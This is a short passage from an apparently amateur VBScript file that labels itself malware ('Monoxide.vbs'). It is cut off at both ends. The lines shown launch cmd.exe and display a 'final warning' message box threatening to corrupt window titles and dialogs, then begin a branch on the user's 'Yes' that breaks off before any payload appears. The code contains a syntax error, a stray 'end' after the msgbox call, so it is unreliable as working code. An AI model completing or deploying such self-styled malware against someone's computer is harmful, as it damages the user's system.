...
set WshShell = WScript.CreateObject ("Wscript.Shell")
WshShell.run ("cmd.exe")
a=msgbox"real FINAL WARNING! If you read the Last Warning Keep in Mind that all title Text get corrpted! and boxes are also getting corrpted! and boxes + others get unused! do you realy wana run this? This is you Final Chance of stopping this form runing!",vbYesNo,"Malware Aleat Monoxide.vbs" end
if a=vbYes then
set WshShell = WScript.CreateObject ("Wscript.Shell")
